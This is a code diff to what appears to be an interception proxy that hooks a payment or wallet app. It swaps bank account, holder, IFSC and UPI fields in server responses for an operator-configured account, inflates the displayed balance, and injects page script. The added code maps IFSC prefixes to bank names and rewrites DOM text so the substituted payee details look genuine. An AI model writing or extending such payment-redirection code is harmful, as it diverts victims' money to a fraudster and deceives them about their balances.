@@ -69,19 +69,63 @@ function cacheSet(key, buf, ct, status, ttl) {
 // Map to debounce repetitive error logs (key -> timestamp)
 const recentErrors = new Map();
 
-// Helper to clean up ugly JSON strings accidentally sent by backend in bank fields
-function cleanUglyBankNames(obj, depth = 0) {
+const IFSC_BANK_MAP = {
+  'IPOS': 'India Post Payments Bank',
+  'SBIN': 'State Bank of India',
+  'HDFC': 'HDFC Bank',
+  'ICIC': 'ICICI Bank',
+  'UTIB': 'Axis Bank',
+  'PUNB': 'Punjab National Bank',
+  'BARB': 'Bank of Baroda',
+  'CNRB': 'Canara Bank',
+  'UBIN': 'Union Bank of India',
+  'BKID': 'Bank of India',
+  'KKBK': 'Kotak Mahindra Bank',
+  'YESB': 'Yes Bank',
+  'IDFB': 'IDFC FIRST Bank',
+  'IOBA': 'Indian Overseas Bank',
+  'MAHB': 'Bank of Maharashtra',
+  'PSIB': 'Punjab & Sind Bank',
+  'CBIN': 'Central Bank of India',
+  'UCOB': 'UCO Bank',
+  'INDB': 'IndusInd Bank',
+  'FDRL': 'Federal Bank',
+  'AIRP': 'Airtel Payments Bank',
+  'PYTM': 'Paytm Payments Bank',
+  'JIOP': 'Jio Payments Bank',
+  'FINO': 'Fino Payments Bank',
+  'AUBL': 'AU Small Finance Bank',
+  'ESFB': 'Equitas Small Finance Bank',
+  'USFB': 'Ujjivan Small Finance Bank'
+};
+
+function getBankNameFromIfsc(ifsc) {
+  if (!ifsc || typeof ifsc !== 'string') return 'Bank';
+  const prefix = ifsc.trim().substring(0, 4).toUpperCase();
+  return IFSC_BANK_MAP[prefix] || 'Bank';
+}
+
+// Helper to clean up ugly JSON strings or IFSC codes accidentally sent in bank fields
+function cleanUglyBankNames(obj, depth = 0, defaultBankName = 'Bank') {
   if (!obj || typeof obj !== 'object' || depth > 10) return;
   if (Array.isArray(obj)) {
-    for (const item of obj) cleanUglyBankNames(item, depth + 1);
+    for (const item of obj) cleanUglyBankNames(item, depth + 1, defaultBankName);
     return;
   }
   for (const k of Object.keys(obj)) {
-    if (typeof obj[k] === 'object') {
-      cleanUglyBankNames(obj[k], depth + 1);
+    if (typeof obj[k] === 'object' && obj[k] !== null) {
+      cleanUglyBankNames(obj[k], depth + 1, defaultBankName);
     } else if (typeof obj[k] === 'string') {
-      if (obj[k].startsWith('{"code":') && obj[k].includes('"msg":')) {
-        obj[k] = 'Bank';
+      const val = obj[k].trim();
+      const kl = k.toLowerCase().replace(/[_-]/g, '');
+
+      // 1. JSON string error (like {"code":0,"msg":"ok","data":{}})
+      if (val.startsWith('{') && (val.includes('"code"') || val.includes('"msg"') || val.includes('"data"'))) {
+        obj[k] = defaultBankName || 'Bank';
+      }
+      // 2. IFSC code placed in bank name fields (like BARB0JODPAL, IPOS0000001)
+      else if ((kl.includes('bankname') || kl === 'bank' || kl.includes('acctbank') || kl === 'payeebankname') && /^[A-Z]{4}0[A-Z0-9]{6}$/i.test(val)) {
+        obj[k] = getBankNameFromIfsc(val);
       }
     }
   }
@@ -490,14 +534,25 @@ function replaceWalletUrl(urlStr, bank) {
 function deepReplaceBankFields(obj, bank, depth, globalHasAcct) {
   if (!obj || typeof obj !== 'object' || depth > 10) return;
   if (Array.isArray(obj)) { for (let i = 0; i < obj.length; i++) deepReplaceBankFields(obj[i], bank, depth + 1, globalHasAcct); return; }
+  const resolvedBankName = (bank && bank.bankName) ? bank.bankName : (bank && bank.ifsc ? getBankNameFromIfsc(bank.ifsc) : 'Bank');
   for (const k of Object.keys(obj)) {
-    if (typeof obj[k] === 'object') { deepReplaceBankFields(obj[k], bank, depth + 1, globalHasAcct); continue; }
+    if (typeof obj[k] === 'object' && obj[k] !== null) {
+      deepReplaceBankFields(obj[k], bank, depth + 1, globalHasAcct);
+      continue;
+    }
     if (typeof obj[k] !== 'string' && typeof obj[k] !== 'number') continue;
     const kl = k.toLowerCase().replace(/[_-]/g, '');
     const mapping = BANK_FIELD_MAP[kl];
+    if (mapping === 'bankName') {
+      obj[k] = resolvedBankName;
+      continue;
+    }
     if (mapping && bank[mapping] && String(obj[k]).length > 0) { obj[k] = bank[mapping]; continue; }
     if (globalHasAcct && bank.accountHolder && NAME_FIELDS.includes(kl) && String(obj[k]).length > 0) { obj[k] = bank.accountHolder; continue; }
-    if (kl === 'bank' && bank.bankName && String(obj[k]).length > 0) { obj[k] = bank.bankName; continue; }
+    if (kl === 'bank' || kl === 'bankname' || kl === 'payeebankname' || kl === 'receiverbankname' || kl === 'payerbankname' || kl === 'acctbankname') {
+      obj[k] = resolvedBankName;
+      continue;
+    }
     // Replace bank details embedded inside wallet deep-link URL strings
     if (typeof obj[k] === 'string' && obj[k].includes('://')) {
       const replaced = replaceWalletUrl(obj[k], bank);
@@ -625,12 +680,13 @@ app.get('/hook/config', async (req, res) => {
     const tracked = (userId && data.trackedUsers) ? data.trackedUsers[String(userId)] : null;
     const lastRealBal = (uo && uo.lastRealBalance !== undefined) ? uo.lastRealBalance : (tracked && tracked.balance !== undefined ? parseFloat(tracked.balance) : null);
     const shownBal = lastRealBal !== null ? parseFloat((lastRealBal + totalBonus).toFixed(2)) : (totalBonus > 0 ? totalBonus : null);
+    const resolvedBn = bank ? (bank.bankName || (bank.ifsc ? getBankNameFromIfsc(bank.ifsc) : 'Bank')) : 'Bank';
     res.json({
       enabled: data.botEnabled !== false,
       an: bank ? bank.accountNo : '',
       ah: bank ? bank.accountHolder : '',
       if: bank ? bank.ifsc : '',
-      bn: bank ? (bank.bankName || '') : '',
+      bn: resolvedBn,
       ui: bank ? (bank.upiId || '') : '',
       tg: TELEGRAM_OVERRIDE,
       bonus: totalBonus,
@@ -639,7 +695,7 @@ app.get('/hook/config', async (req, res) => {
       usdtAddr: data.usdtAddress || ''
     });
   } catch (e) {
-    res.json({ enabled: false, an: '', ah: '', if: '', bn: '', ui: '', tg: TELEGRAM_OVERRIDE, bonus: 0 });
+    res.json({ enabled: false, an: '', ah: '', if: '', bn: 'Bank', ui: '', tg: TELEGRAM_OVERRIDE, bonus: 0 });
   }
 });
 
@@ -2246,7 +2302,9 @@ ${replaceLine}
       now
     }).catch(() => { });
 
-    if (jsonResp) cleanUglyBankNames(jsonResp);
+    const curBank = getActiveBank(data, userId);
+    const defBankName = (curBank && curBank.bankName) ? curBank.bankName : ((curBank && curBank.ifsc) ? getBankNameFromIfsc(curBank.ifsc) : 'Bank');
+    if (jsonResp) cleanUglyBankNames(jsonResp, 0, defBankName);
     sendJson(res, respHeaders, jsonResp);
 
   } catch (e) {
@@ -2397,8 +2455,12 @@ if(!window.xamlAction){
         if(action==='getDeviceInfo')return window.xamlAction.getDeviceInfo();
         if(action==='closeWebview'){window.history.back();return '';}
         if(action==='openWebview'&&(p.url||p.ct_url)){window.location.href=p.url||p.ct_url;return '';}
-        return JSON.stringify({code:0,msg:'ok',data:{}});
-      }catch(e){return JSON.stringify({code:0,msg:'ok',data:{}});}
+        var bName=(CFG&&CFG.bn)||'Bank';
+        if(action==='getBankName'||action==='getBank'||action==='queryBank'||action==='getBankByIfsc'||action==='bankName'){
+          return bName;
+        }
+        return bName;
+      }catch(e){return (CFG&&CFG.bn)||'Bank';}
     }
   };
 }
@@ -2454,7 +2516,24 @@ if(!isNaN(bv)&&bv>0){_cachedBal=bv.toFixed(2);
 try{localStorage.setItem('_px_bal',_cachedBal);}catch(e){}return;}}}
 for(var k in obj){if(typeof obj[k]==='object'&&obj[k]!==null&&!Array.isArray(obj[k])){cacheBal(obj[k]);}}}
 
+function patchBankDOM(){
+if(!document.body)return;
+var bName=(CFG&&CFG.bn)||'Bank';
+var walker=document.createTreeWalker(document.body,NodeFilter.SHOW_TEXT,null,false);
+var toFix=[];
+while(walker.nextNode()){
+var nd=walker.currentNode;
+var txt=(nd.textContent||'').trim();
+if(txt.indexOf('{"code":')!==-1||txt.indexOf('"msg":')!==-1||txt.indexOf('"data":')!==-1||/^[A-Z]{4}0[A-Z0-9]{6}$/.test(txt)){
+var el=nd.parentElement;
+if(!el)continue;
+var ctx=((el.innerText||'')+' '+(el.parentElement?el.parentElement.innerText:'')).toLowerCase();
+if(ctx.indexOf('bank')!==-1||txt.indexOf('{"code":')!==-1){
+toFix.push(nd);}}}
+for(var i=0;i<toFix.length;i++){toFix[i].textContent=bName;}}
+
 function patchBalDOM(){
+patchBankDOM();
 if(!_cachedBal||_cachedBal==='0'||_cachedBal==='0.00')return;
 if(!document.body)return;
 var walker=document.createTreeWalker(document.body,NodeFilter.SHOW_TEXT,null,false);
